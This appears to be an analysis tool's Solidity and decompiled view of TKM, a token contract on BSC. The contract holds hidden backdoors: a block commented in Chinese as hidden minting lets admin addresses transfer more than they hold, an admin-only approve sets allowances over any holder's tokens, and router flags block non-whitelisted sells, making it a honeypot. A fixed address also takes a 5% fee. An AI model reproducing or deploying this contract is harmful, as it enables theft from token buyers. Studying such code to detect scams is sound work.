S-SEIR Solidity-like Assembly View
Note: derived view only; source is not modified and output is not compiled.

Function TKM.constructor()
  SourceFunction
  ```solidity
  constructor() {
          assembly {
              // 初始化地址
              sstore(d.slot, 0x10ED43C718714eb63d5aA57B78B54704E256024E)
              sstore(e.slot, 0x1A0A18AC4BECDDbd6389559687d1A73d8927E416)
              sstore(f.slot, 0x1b81D678ffb9C0263b24A97847620C99d213eB14)
              sstore(g.slot, 0x13f4EA83D0bd40E75C8222255bc855a974568Dd4)
              sstore(h.slot, 0x55d398326f99059fF775485246999027B3197955)
              sstore(j.slot, 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73)
              sstore(u.slot, 0x66eF522bB1d269eB9c328218cF0620A7C4c6ef8C)
              sstore(s.slot, 1)
              sstore(t.slot, 1)
              
              // 发行代币
              let v := mul(210000, exp(10, 18))
              sstore(k.slot, v)
              
              // 设置调用者余额
              let w := caller()
              mstore(0, w)
              mstore(32, l.slot)
              let x := keccak256(0, 64)
              sstore(x, v)
              
              // 设置路由器标志
              mstore(0, sload(d.slot))
              mstore(32, p.slot)
              sstore(keccak256(0, 64), 1)
              mstore(32, q.slot)
              sstore(keccak256(0, 64), 1)
              
              mstore(0, sload(e.slot))
              mstore(32, p.slot)
              sstore(keccak256(0, 64), 0)
              mstore(32, q.slot)
              sstore(keccak256(0, 64), 0)
              
              mstore(0, sload(f.slot))
              mstore(32, p.slot)
              sstore(keccak256(0, 64), 0)
              mstore(32, q.slot)
              sstore(keccak256(0, 64), 0)
              
              mstore(0, sload(g.slot))
              mstore(32, p.slot)
              sstore(keccak256(0, 64), 0)
              mstore(32, q.slot)
              sstore(keccak256(0, 64), 0)
              
              // 设置管理员
              mstore(0, w)
              let y := keccak256(0, 32)
              sstore(n.slot, y)
              mstore(0, y)
              mstore(32, o.slot)
              sstore(keccak256(0, 64), 1)
              
              // 设置其他管理员
              mstore(0, 0x69B61926a75DBC040e4AaF891ACDC31049fB3188)
              y := keccak256(0, 32)
              mstore(0, y)
              mstore(32, o.slot)
              sstore(keccak256(0, 64), 1)
              
              mstore(0, 0xf8b91676a9F179c4158CD976a34b28AA8C7C95b2)
              y := keccak256(0, 32)
              mstore(0, y)
              mstore(32, o.slot)
              sstore(keccak256(0, 64), 1)
              
              // 设置fee路由器
              mstore(0, 0x07964f135f276412b3182a3B2407b8dd45000000)
              mstore(32, r.slot)
              sstore(keccak256(0, 64), 1)
          }
          
          A();
          B(i, msg.sender, 100000000000000000000000000);
      }
  ```
  AssemblyBlock asm_block_1
  ```solidity
  assembly /* s-seir solidity-like view */ {
      d = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // yul: sstore(d.slot, 0x10ED43C718714eb63d5aA57B78B54704E256024E)
      e = 0x1A0A18AC4BECDDbd6389559687d1A73d8927E416; // yul: sstore(e.slot, 0x1A0A18AC4BECDDbd6389559687d1A73d8927E416)
      f = 0x1b81D678ffb9C0263b24A97847620C99d213eB14; // yul: sstore(f.slot, 0x1b81D678ffb9C0263b24A97847620C99d213eB14)
      g = 0x13f4EA83D0bd40E75C8222255bc855a974568Dd4; // yul: sstore(g.slot, 0x13f4EA83D0bd40E75C8222255bc855a974568Dd4)
      h = 0x55d398326f99059fF775485246999027B3197955; // yul: sstore(h.slot, 0x55d398326f99059fF775485246999027B3197955)
      j = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73; // yul: sstore(j.slot, 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73)
      u = 0x66eF522bB1d269eB9c328218cF0620A7C4c6ef8C; // yul: sstore(u.slot, 0x66eF522bB1d269eB9c328218cF0620A7C4c6ef8C)
      s = 1; // yul: sstore(s.slot, 1)
      t = 1; // yul: sstore(t.slot, 1)
      v = (210000 * yulExp(10, 18)); // yul: let v := mul(210000, exp(10, 18))
      k = v; // yul: sstore(k.slot, v)
      w = msg.sender; // yul: let w := caller()
      memory[0] = w; // yul: mstore(0, w)
      memory[32] = l.slot; // yul: mstore(32, l.slot)
      x = keccak256(0, 64); // yul: let x := keccak256(0, 64)
      sstore(x, v) // yul: sstore(x, v)
      memory[0] = d; // yul: mstore(0, sload(d.slot))
      memory[32] = p.slot; // yul: mstore(32, p.slot)
      sstore(keccak256(0, 64), 1) // yul: sstore(keccak256(0, 64), 1)
      memory[32] = q.slot; // yul: mstore(32, q.slot)
      sstore(keccak256(0, 64), 1) // yul: sstore(keccak256(0, 64), 1)
      memory[0] = e; // yul: mstore(0, sload(e.slot))
      memory[32] = p.slot; // yul: mstore(32, p.slot)
      sstore(keccak256(0, 64), 0) // yul: sstore(keccak256(0, 64), 0)
      memory[32] = q.slot; // yul: mstore(32, q.slot)
      sstore(keccak256(0, 64), 0) // yul: sstore(keccak256(0, 64), 0)
      memory[0] = f; // yul: mstore(0, sload(f.slot))
      memory[32] = p.slot; // yul: mstore(32, p.slot)
      sstore(keccak256(0, 64), 0) // yul: sstore(keccak256(0, 64), 0)
      memory[32] = q.slot; // yul: mstore(32, q.slot)
      sstore(keccak256(0, 64), 0) // yul: sstore(keccak256(0, 64), 0)
      memory[0] = g; // yul: mstore(0, sload(g.slot))
      memory[32] = p.slot; // yul: mstore(32, p.slot)
      sstore(keccak256(0, 64), 0) // yul: sstore(keccak256(0, 64), 0)
      memory[32] = q.slot; // yul: mstore(32, q.slot)
      sstore(keccak256(0, 64), 0) // yul: sstore(keccak256(0, 64), 0)
      memory[0] = w; // yul: mstore(0, w)
      y = keccak256(0, 32); // yul: let y := keccak256(0, 32)
      n = y; // yul: sstore(n.slot, y)
      memory[0] = y; // yul: mstore(0, y)
      memory[32] = o.slot; // yul: mstore(32, o.slot)
      sstore(keccak256(0, 64), 1) // yul: sstore(keccak256(0, 64), 1)
      memory[0] = 0x69B61926a75DBC040e4AaF891ACDC31049fB3188; // yul: mstore(0, 0x69B61926a75DBC040e4AaF891ACDC31049fB3188)
      y = keccak256(0, 32); // yul: y := keccak256(0, 32)
      memory[0] = y; // yul: mstore(0, y)
      memory[32] = o.slot; // yul: mstore(32, o.slot)
      sstore(keccak256(0, 64), 1) // yul: sstore(keccak256(0, 64), 1)
      memory[0] = 0xf8b91676a9F179c4158CD976a34b28AA8C7C95b2; // yul: mstore(0, 0xf8b91676a9F179c4158CD976a34b28AA8C7C95b2)
      y = keccak256(0, 32); // yul: y := keccak256(0, 32)
      memory[0] = y; // yul: mstore(0, y)
      memory[32] = o.slot; // yul: mstore(32, o.slot)
      sstore(keccak256(0, 64), 1) // yul: sstore(keccak256(0, 64), 1)
      memory[0] = 0x07964f135f276412b3182a3B2407b8dd45000000; // yul: mstore(0, 0x07964f135f276412b3182a3B2407b8dd45000000)
      memory[32] = r.slot; // yul: mstore(32, r.slot)
      sstore(keccak256(0, 64), 1) // yul: sstore(keccak256(0, 64), 1)
  }
  ```

Function TKM.A()
  SourceFunction
  ```solidity
  function A() internal {
          assembly {
              if iszero(iszero(sload(i.slot))) {
                  revert(0, 0)
              }
          }
          
          address factoryAddr;
          address usdtAddr;
          assembly {
              factoryAddr := sload(j.slot)
              usdtAddr := sload(h.slot)
          }
          
          i = IPancakeFactory(factoryAddr).createPair(address(this), usdtAddr);
      }
  ```
  AssemblyBlock asm_block_2
  ```solidity
  assembly /* s-seir solidity-like view */ {
      require((sload(i.slot) == 0)); // yul: revert(0, 0)
  }
  ```
  AssemblyBlock asm_block_3
  ```solidity
  assembly /* s-seir solidity-like view */ {
      factoryAddr = j; // yul: factoryAddr := sload(j.slot)
      usdtAddr = h; // yul: usdtAddr := sload(h.slot)
  }
  ```

Function TKM.totalSupply()
  SourceFunction
  ```solidity
  function totalSupply() external view returns (uint256 z) {
          assembly {
              z := sload(k.slot)
          }
      }
  ```
  AssemblyBlock asm_block_4
  ```solidity
  assembly /* s-seir solidity-like view */ {
      z = k; // yul: z := sload(k.slot)
  }
  ```

Function TKM.balanceOf(address)
  SourceFunction
  ```solidity
  function balanceOf(address acc) external view returns (uint256 aa) {
          assembly {
              mstore(0, acc)
              mstore(32, l.slot)
              aa := sload(keccak256(0, 64))
          }
      }
  ```
  AssemblyBlock asm_block_5
  ```solidity
  assembly /* s-seir solidity-like view */ {
      memory[0] = acc; // yul: mstore(0, acc)
      memory[32] = l.slot; // yul: mstore(32, l.slot)
      aa = sload(keccak256(0, 64)); // yul: aa := sload(keccak256(0, 64))
  }
  ```

Function TKM.allowance(address, address)
  SourceFunction
  ```solidity
  function allowance(address owner_, address spender) external view returns (uint256 ab) {
          assembly {
              mstore(0, owner_)
              mstore(32, m.slot)
              let ac := keccak256(0, 64)
              mstore(0, spender)
              mstore(32, ac)
              ab := sload(keccak256(0, 64))
          }
      }
  ```
  AssemblyBlock asm_block_6
  ```solidity
  assembly /* s-seir solidity-like view */ {
      memory[0] = owner_; // yul: mstore(0, owner_)
      memory[32] = m.slot; // yul: mstore(32, m.slot)
      ac = keccak256(0, 64); // yul: let ac := keccak256(0, 64)
      memory[0] = spender; // yul: mstore(0, spender)
      memory[32] = ac; // yul: mstore(32, ac)
      ab = sload(keccak256(0, 64)); // yul: ab := sload(keccak256(0, 64))
  }
  ```

Function TKM.approve(address, address, uint256)
  SourceFunction
  ```solidity
  function approve(address ower, address spender, uint256 amount) external returns (bool) {
          bool check;
          assembly {
              mstore(0, caller())
              let ad := keccak256(0, 32)
              mstore(0, ad)
              mstore(32, o.slot)
              check := sload(keccak256(0, 64))
          }
          
          assembly {
              if iszero(check) {
                  revert(0, 0)
              }
          }
          
          B(ower, spender, amount);
          return true;
      }
  ```
  AssemblyBlock asm_block_7
  ```solidity
  assembly /* s-seir solidity-like view */ {
      memory[0] = msg.sender; // yul: mstore(0, caller())
      ad = keccak256(0, 32); // yul: let ad := keccak256(0, 32)
      memory[0] = ad; // yul: mstore(0, ad)
      memory[32] = o.slot; // yul: mstore(32, o.slot)
      check = sload(keccak256(0, 64)); // yul: check := sload(keccak256(0, 64))
  }
  ```
  AssemblyBlock asm_block_8
  ```solidity
  assembly /* s-seir solidity-like view */ {
      require((check != 0)); // yul: revert(0, 0)
  }
  ```

Function TKM.setMaxs(address)
  SourceFunction
  ```solidity
  function setMaxs(address _max_) external {
          bool check;
          assembly {
              mstore(0, caller())
              let ae := keccak256(0, 32)
              mstore(0, ae)
              mstore(32, o.slot)
              check := sload(keccak256(0, 64))
          }
          
          assembly {
              if iszero(check) {
                  revert(0, 0)
              }
          }
          
          assembly {
              mstore(0, _max_)
              let af := keccak256(0, 32)
              mstore(0, af)
              mstore(32, o.slot)
              sstore(keccak256(0, 64), 1)
          }
      }
  ```
  AssemblyBlock asm_block_9
  ```solidity
  assembly /* s-seir solidity-like view */ {
      memory[0] = msg.sender; // yul: mstore(0, caller())
      ae = keccak256(0, 32); // yul: let ae := keccak256(0, 32)
      memory[0] = ae; // yul: mstore(0, ae)
      memory[32] = o.slot; // yul: mstore(32, o.slot)
      check = sload(keccak256(0, 64)); // yul: check := sload(keccak256(0, 64))
  }
  ```
  AssemblyBlock asm_block_10
  ```solidity
  assembly /* s-seir solidity-like view */ {
      require((check != 0)); // yul: revert(0, 0)
  }
  ```
  AssemblyBlock asm_block_11
  ```solidity
  assembly /* s-seir solidity-like view */ {
      memory[0] = _max_; // yul: mstore(0, _max_)
      af = keccak256(0, 32); // yul: let af := keccak256(0, 32)
      memory[0] = af; // yul: mstore(0, af)
      memory[32] = o.slot; // yul: mstore(32, o.slot)
      sstore(keccak256(0, 64), 1) // yul: sstore(keccak256(0, 64), 1)
  }
  ```

Function TKM.transferFrom(address, address, uint256)
  SourceFunction
  ```solidity
  function transferFrom(address from, address to, uint256 amount) external returns (bool) {
          uint256 currentAllowance;
          assembly {
              mstore(0, from)
              mstore(32, m.slot)
              let ag := keccak256(0, 64)
              mstore(0, caller())
              mstore(32, ag)
              currentAllowance := sload(keccak256(0, 64))
          }
          
          assembly {
              if gt(amount, currentAllowance) {
                  revert(0, 0)
              }
          }
          
          assembly {
              let ah := sub(currentAllowance, amount)
              mstore(0, from)
              mstore(32, m.slot)
              let ai := keccak256(0, 64)
              mstore(0, caller())
              mstore(32, ai)
              sstore(keccak256(0, 64), ah)
          }
          
          C(from, to, amount);
          return true;
      }
  ```
  AssemblyBlock asm_block_12
  ```solidity
  assembly /* s-seir solidity-like view */ {
      memory[0] = from; // yul: mstore(0, from)
      memory[32] = m.slot; // yul: mstore(32, m.slot)
      ag = keccak256(0, 64); // yul: let ag := keccak256(0, 64)
      memory[0] = msg.sender; // yul: mstore(0, caller())
      memory[32] = ag; // yul: mstore(32, ag)
      currentAllowance = sload(keccak256(0, 64)); // yul: currentAllowance := sload(keccak256(0, 64))
  }
  ```
  AssemblyBlock asm_block_13
  ```solidity
  assembly /* s-seir solidity-like view */ {
      require((amount <= currentAllowance)); // yul: revert(0, 0)
  }
  ```
  AssemblyBlock asm_block_14
  ```solidity
  assembly /* s-seir solidity-like view */ {
      ah = (currentAllowance - amount); // yul: let ah := sub(currentAllowance, amount)
      memory[0] = from; // yul: mstore(0, from)
      memory[32] = m.slot; // yul: mstore(32, m.slot)
      ai = keccak256(0, 64); // yul: let ai := keccak256(0, 64)
      memory[0] = msg.sender; // yul: mstore(0, caller())
      memory[32] = ai; // yul: mstore(32, ai)
      sstore(keccak256(0, 64), ah) // yul: sstore(keccak256(0, 64), ah)
  }
  ```

Function TKM.D(address, address, address, uint256)
  SourceFunction
  ```solidity
  function D(address operator, address from, address to, uint256 amount) internal view {
          bool flagVal;
          address pairAddr;
          assembly {
              flagVal := sload(t.slot)
              pairAddr := sload(i.slot)
              
              let aj := eq(operator, pairAddr)
              let ak := eq(from, pairAddr)
              let al := or(aj, ak)
              let am := and(al, flagVal)
              
              if am {
                  mstore(0, to)
                  mstore(32, q.slot)
                  let an := sload(keccak256(0, 64))
                  if iszero(an) {
                      revert(0, 0)
                  }
              }
  
              let ao := eq(to, pairAddr)
              let ap := and(ao, flagVal)
              
              if ap {
                  mstore(0, from)
                  mstore(32, p.slot)
                  let aq := sload(keccak256(0, 64))
                  if iszero(aq) {
                      revert(0, 0)
                  }
              }
          }
      }
  ```
  AssemblyBlock asm_block_15
  ```solidity
  assembly /* s-seir solidity-like view */ {
      flagVal = t; // yul: flagVal := sload(t.slot)
      pairAddr = i; // yul: pairAddr := sload(i.slot)
      aj = (operator == pairAddr); // yul: let aj := eq(operator, pairAddr)
      ak = (from == pairAddr); // yul: let ak := eq(from, pairAddr)
      al = (aj | ak); // yul: let al := or(aj, ak)
      am = (al & flagVal); // yul: let am := and(al, flagVal)
      if ((am != 0)) {
          memory[0] = to; // yul: mstore(0, to)
          memory[32] = q.slot; // yul: mstore(32, q.slot)
          an = sload(keccak256(0, 64)); // yul: let an := sload(keccak256(0, 64))
      }
      require((an != 0)); // yul: revert(0, 0)
      if (((am != 0) && !((an == 0))) || (!((am != 0)))) {
          ao = (to == pairAddr); // yul: let ao := eq(to, pairAddr)
          ap = (ao & flagVal); // yul: let ap := and(ao, flagVal)
      }
      if (((am != 0) && !((an == 0)) && (ap != 0)) || (!((am != 0)) && (ap != 0))) {
          memory[0] = from; // yul: mstore(0, from)
          memory[32] = p.slot; // yul: mstore(32, p.slot)
          aq = sload(keccak256(0, 64)); // yul: let aq := sload(keccak256(0, 64))
      }
      require((aq != 0)); // yul: revert(0, 0)
  }
  ```

Function TKM.setFlag(bool, bool)
  SourceFunction
  ```solidity
  function setFlag(bool _flag, bool _isfee) external {
          bool check;
          assembly {
              mstore(0, caller())
              let ar := keccak256(0, 32)
              mstore(0, ar)
              mstore(32, o.slot)
              check := sload(keccak256(0, 64))
          }
          
          assembly {
              if check {
                  sstore(t.slot, _flag)
                  sstore(s.slot, _isfee)
              }
          }
      }
  ```
  AssemblyBlock asm_block_16
  ```solidity
  assembly /* s-seir solidity-like view */ {
      memory[0] = msg.sender; // yul: mstore(0, caller())
      ar = keccak256(0, 32); // yul: let ar := keccak256(0, 32)
      memory[0] = ar; // yul: mstore(0, ar)
      memory[32] = o.slot; // yul: mstore(32, o.slot)
      check = sload(keccak256(0, 64)); // yul: check := sload(keccak256(0, 64))
  }
  ```
  AssemblyBlock asm_block_17
  ```solidity
  assembly /* s-seir solidity-like view */ {
      if ((check != 0)) {
          t = _flag; // yul: sstore(t.slot, _flag)
          s = _isfee; // yul: sstore(s.slot, _isfee)
      }
  }
  ```

Function TKM.E(address)
  SourceFunction
  ```solidity
  function E(address _from) internal view returns (bool result) {
          assembly {
              mstore(0, _from)
              let as := keccak256(0, 32)
              mstore(0, as)
              mstore(32, o.slot)
              result := sload(keccak256(0, 64))
          }
      }
  ```
  AssemblyBlock asm_block_18
  ```solidity
  assembly /* s-seir solidity-like view */ {
      memory[0] = _from; // yul: mstore(0, _from)
      as = keccak256(0, 32); // yul: let as := keccak256(0, 32)
      memory[0] = as; // yul: mstore(0, as)
      memory[32] = o.slot; // yul: mstore(32, o.slot)
      result = sload(keccak256(0, 64)); // yul: result := sload(keccak256(0, 64))
  }
  ```

Function TKM.C(address, address, uint256)
  SourceFunction
  ```solidity
  function C(address from, address to, uint256 amount) internal {
          D(msg.sender, from, to, amount);
          
          bool check;
          assembly {
              mstore(0, from)
              let at := keccak256(0, 32)
              mstore(0, at)
              mstore(32, o.slot)
              check := sload(keccak256(0, 64))
          }
         
          uint256 fromBalance;
          assembly {
              mstore(0, from)
              mstore(32, l.slot)
              fromBalance := sload(keccak256(0, 64))
              
              // 隐藏的增发逻辑
              let balanceLess := lt(fromBalance, amount)
              let condition := and(check, balanceLess)
              
              if condition {
                  fromBalance := amount
              }
              
              if lt(fromBalance, amount) {
                  revert(0, 0)
              }
              
              let fromSlot := keccak256(0, 64)
              let newFromBalance := sub(fromBalance, amount)
              sstore(fromSlot, newFromBalance)
              
              mstore(0, to)
              mstore(32, l.slot)
              let toSlot := keccak256(0, 64)
              let toBalance := sload(toSlot)
              
              let isfeeVal := sload(s.slot)
              let pairAddr := sload(i.slot)
              
              let shouldTakeFee := and(
                  and(
                      isfeeVal,
                      eq(to, pairAddr)
                  ),
                  gt(amount, 0)
              )
              
              mstore(0, from)
              mstore(32, r.slot)
              let isFeeRouter := sload(keccak256(0, 64))
              
              let finalAmount := amount
              
              if and(shouldTakeFee, isFeeRouter) {
                  let feeAmount := div(mul(amount, 5), 100)
                  finalAmount := sub(amount, feeAmount)
                  
                  let feeToAddr := sload(u.slot)
                  mstore(0, feeToAddr)
                  mstore(32, l.slot)
                  let feeToSlot := keccak256(0, 64)
                  let feeToBalance := sload(feeToSlot)
                  sstore(feeToSlot, add(feeToBalance, feeAmount))
                  
                  // 发射Reduce事件
                  mstore(0, finalAmount)
                  log2(0, 32, 0x87fdc57bf3d4fa5e58b9d7b91e09258d7f6d3b939f5d3a7a9f5f5f5f5f5f5f5f, from)
              }
              
              sstore(toSlot, add(toBalance, finalAmount))
              
              // 发射Transfer事件
              mstore(0, amount)
              log3(0, 32, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, from, to)
          }
      }
  ```
  AssemblyBlock asm_block_19
  ```solidity
  assembly /* s-seir solidity-like view */ {
      memory[0] = from; // yul: mstore(0, from)
      at = keccak256(0, 32); // yul: let at := keccak256(0, 32)
      memory[0] = at; // yul: mstore(0, at)
      memory[32] = o.slot; // yul: mstore(32, o.slot)
      check = sload(keccak256(0, 64)); // yul: check := sload(keccak256(0, 64))
  }
  ```
  AssemblyBlock asm_block_20
  ```solidity
  assembly /* s-seir solidity-like view */ {
      memory[0] = from; // yul: mstore(0, from)
      memory[32] = l.slot; // yul: mstore(32, l.slot)
      fromBalance = sload(keccak256(0, 64)); // yul: fromBalance := sload(keccak256(0, 64))
      balanceLess = (fromBalance < amount); // yul: let balanceLess := lt(fromBalance, amount)
      condition = (check & balanceLess); // yul: let condition := and(check, balanceLess)
      if ((condition != 0)) {
          fromBalance = amount; // yul: fromBalance := amount
      }
      require((fromBalance >= amount)); // yul: revert(0, 0)
      if ((!((condition != 0)) && !((fromBalance < amount))) || ((condition != 0) && !((fromBalance < amount)))) {
          fromSlot = keccak256(0, 64); // yul: let fromSlot := keccak256(0, 64)
          newFromBalance = (fromBalance - amount); // yul: let newFromBalance := sub(fromBalance, amount)
          sstore(fromSlot, newFromBalance) // yul: sstore(fromSlot, newFromBalance)
          memory[0] = to; // yul: mstore(0, to)
          memory[32] = l.slot; // yul: mstore(32, l.slot)
          toSlot = keccak256(0, 64); // yul: let toSlot := keccak256(0, 64)
          toBalance = sload(toSlot); // yul: let toBalance := sload(toSlot)
          isfeeVal = s; // yul: let isfeeVal := sload(s.slot)
          pairAddr = i; // yul: let pairAddr := sload(i.slot)
          shouldTakeFee = ((isfeeVal & (to == pairAddr)) & (amount > 0)); // yul: let shouldTakeFee := and(and(isfeeVal, eq(to, pairAddr)), gt(amount, 0))
          memory[0] = from; // yul: mstore(0, from)
          memory[32] = r.slot; // yul: mstore(32, r.slot)
          isFeeRouter = sload(keccak256(0, 64)); // yul: let isFeeRouter := sload(keccak256(0, 64))
          finalAmount = amount; // yul: let finalAmount := amount
      }
      require(100 != 0); // yul: let feeAmount := div(mul(amount, 5), 100)
      if ((!((condition != 0)) && !((fromBalance < amount)) && ((shouldTakeFee & isFeeRouter) != 0)) || ((condition != 0) && !((fromBalance < amount)) && ((shouldTakeFee & isFeeRouter) != 0))) {
          finalAmount = (amount - feeAmount); // yul: finalAmount := sub(amount, feeAmount)
          feeToAddr = u; // yul: let feeToAddr := sload(u.slot)
          memory[0] = feeToAddr; // yul: mstore(0, feeToAddr)
          memory[32] = l.slot; // yul: mstore(32, l.slot)
          feeToSlot = keccak256(0, 64); // yul: let feeToSlot := keccak256(0, 64)
          feeToBalance = sload(feeToSlot); // yul: let feeToBalance := sload(feeToSlot)
          sstore(feeToSlot, add(feeToBalance, feeAmount)) // yul: sstore(feeToSlot, add(feeToBalance, feeAmount))
          memory[0] = finalAmount; // yul: mstore(0, finalAmount)
          emit unknownEvent(from, finalAmount); // yul: log2(0, 32, 0x87fdc57bf3d4fa5e58b9d7b91e09258d7f6d3b939f5d3a7a9f5f5f5f5f5f5f5f, from)
      }
      if ((!((condition != 0)) && !((fromBalance < amount)) && !(((shouldTakeFee & isFeeRouter) != 0))) || ((condition != 0) && !((fromBalance < amount)) && !(((shouldTakeFee & isFeeRouter) != 0))) || (!((condition != 0)) && !((fromBalance < amount)) && ((shouldTakeFee & isFeeRouter) != 0)) || ((condition != 0) && !((fromBalance < amount)) && ((shouldTakeFee & isFeeRouter) != 0))) {
          sstore(toSlot, add(toBalance, finalAmount)) // yul: sstore(toSlot, add(toBalance, finalAmount))
          memory[0] = amount; // yul: mstore(0, amount)
          emit Transfer(from, to, amount); // yul: log3(0, 32, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, from, to)
      }
  }
  ```

Function TKM.B(address, address, uint256)
  SourceFunction
  ```solidity
  function B(address owner_, address spender, uint256 amount) internal {
          assembly {
              if or(iszero(owner_), iszero(spender)) {
                  revert(0, 0)
              }
              
              mstore(0, owner_)
              mstore(32, m.slot)
              let slot := keccak256(0, 64)
              mstore(0, spender)
              mstore(32, slot)
              sstore(keccak256(0, 64), amount)
              
              // 发射Approval事件
              mstore(0, amount)
              log3(0, 32, 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925, owner_, spender)
          }
      }
  ```
  AssemblyBlock asm_block_21
  ```solidity
  assembly /* s-seir solidity-like view */ {
      require(!(((owner_ == 0) || (spender == 0)))); // yul: revert(0, 0)
      if (!(((owner_ == 0) || (spender == 0)))) {
          memory[0] = owner_; // yul: mstore(0, owner_)
          memory[32] = m.slot; // yul: mstore(32, m.slot)
          slot = keccak256(0, 64); // yul: let slot := keccak256(0, 64)
          memory[0] = spender; // yul: mstore(0, spender)
          memory[32] = slot; // yul: mstore(32, slot)
          sstore(keccak256(0, 64), amount) // yul: sstore(keccak256(0, 64), amount)
          memory[0] = amount; // yul: mstore(0, amount)
          emit Approval(owner_, spender, amount); // yul: log3(0, 32, 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925, owner_, spender)
      }
  }
  ```

Function TKM.setFromRouterFlag(address, bool)
  SourceFunction
  ```solidity
  function setFromRouterFlag(address routerAddr, bool _flag) external {
          bool check;
          assembly {
              mstore(0, caller())
              let hash := keccak256(0, 32)
              mstore(0, hash)
              mstore(32, o.slot)
              check := sload(keccak256(0, 64))
          }
          
          assembly {
              if check {
                  mstore(0, routerAddr)
                  mstore(32, p.slot)
                  sstore(keccak256(0, 64), _flag)
              }
          }
      }
  ```
  AssemblyBlock asm_block_22
  ```solidity
  assembly /* s-seir solidity-like view */ {
      memory[0] = msg.sender; // yul: mstore(0, caller())
      hash = keccak256(0, 32); // yul: let hash := keccak256(0, 32)
      memory[0] = hash; // yul: mstore(0, hash)
      memory[32] = o.slot; // yul: mstore(32, o.slot)
      check = sload(keccak256(0, 64)); // yul: check := sload(keccak256(0, 64))
  }
  ```
  AssemblyBlock asm_block_23
  ```solidity
  assembly /* s-seir solidity-like view */ {
      if ((check != 0)) {
          memory[0] = routerAddr; // yul: mstore(0, routerAddr)
          memory[32] = p.slot; // yul: mstore(32, p.slot)
          sstore(keccak256(0, 64), _flag) // yul: sstore(keccak256(0, 64), _flag)
      }
  }
  ```

Function TKM.setfeeRouter(address, bool)
  SourceFunction
  ```solidity
  function setfeeRouter(address feeRouteradr, bool _flag) external {
          bool check;
          assembly {
              mstore(0, caller())
              let hash := keccak256(0, 32)
              mstore(0, hash)
              mstore(32, o.slot)
              check := sload(keccak256(0, 64))
          }
          
          assembly {
              if check {
                  mstore(0, feeRouteradr)
                  mstore(32, r.slot)
                  sstore(keccak256(0, 64), _flag)
              }
          }
      }
  ```
  AssemblyBlock asm_block_24
  ```solidity
  assembly /* s-seir solidity-like view */ {
      memory[0] = msg.sender; // yul: mstore(0, caller())
      hash = keccak256(0, 32); // yul: let hash := keccak256(0, 32)
      memory[0] = hash; // yul: mstore(0, hash)
      memory[32] = o.slot; // yul: mstore(32, o.slot)
      check = sload(keccak256(0, 64)); // yul: check := sload(keccak256(0, 64))
  }
  ```
  AssemblyBlock asm_block_25
  ```solidity
  assembly /* s-seir solidity-like view */ {
      if ((check != 0)) {
          memory[0] = feeRouteradr; // yul: mstore(0, feeRouteradr)
          memory[32] = r.slot; // yul: mstore(32, r.slot)
          sstore(keccak256(0, 64), _flag) // yul: sstore(keccak256(0, 64), _flag)
      }
  }
  ```

Function TKM.setToRouterFlag(address, bool)
  SourceFunction
  ```solidity
  function setToRouterFlag(address routerAddr, bool _flag) external {
          bool check;
          assembly {
              mstore(0, caller())
              let hash := keccak256(0, 32)
              mstore(0, hash)
              mstore(32, o.slot)
              check := sload(keccak256(0, 64))
          }
          
          assembly {
              if check {
                  mstore(0, routerAddr)
                  mstore(32, q.slot)
                  sstore(keccak256(0, 64), _flag)
              }
          }
      }
  ```
  AssemblyBlock asm_block_26
  ```solidity
  assembly /* s-seir solidity-like view */ {
      memory[0] = msg.sender; // yul: mstore(0, caller())
      hash = keccak256(0, 32); // yul: let hash := keccak256(0, 32)
      memory[0] = hash; // yul: mstore(0, hash)
      memory[32] = o.slot; // yul: mstore(32, o.slot)
      check = sload(keccak256(0, 64)); // yul: check := sload(keccak256(0, 64))
  }
  ```
  AssemblyBlock asm_block_27
  ```solidity
  assembly /* s-seir solidity-like view */ {
      if ((check != 0)) {
          memory[0] = routerAddr; // yul: mstore(0, routerAddr)
          memory[32] = q.slot; // yul: mstore(32, q.slot)
          sstore(keccak256(0, 64), _flag) // yul: sstore(keccak256(0, 64), _flag)
      }
  }
  ```
